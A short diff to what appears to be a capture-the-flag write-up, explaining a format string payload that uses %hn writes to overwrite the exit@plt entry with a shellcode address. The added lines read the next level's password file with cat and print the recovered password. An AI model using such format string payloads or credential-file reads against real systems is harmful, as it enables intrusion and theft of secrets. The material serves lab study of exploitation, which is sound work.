@@ -84,3 +84,5 @@ Dump of assembler code for function main:
     "\xe2\x97\x04\x08" --> address of the low bytes of exit@plt
     "%249x%10$hn" --> write 0x0101 (0x101 = 0xf9(249) + 0x8) for the low address of our shellcode with index 10 ("\xe0\x97\x04\x08")
     "%65278x%11$hn" --> write 0xffff (0xffff = 0xfefe(65278) + 0x0101) for the high address of our shellcode with index 11 ("\xe2\x97\x04\x08")
+    cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
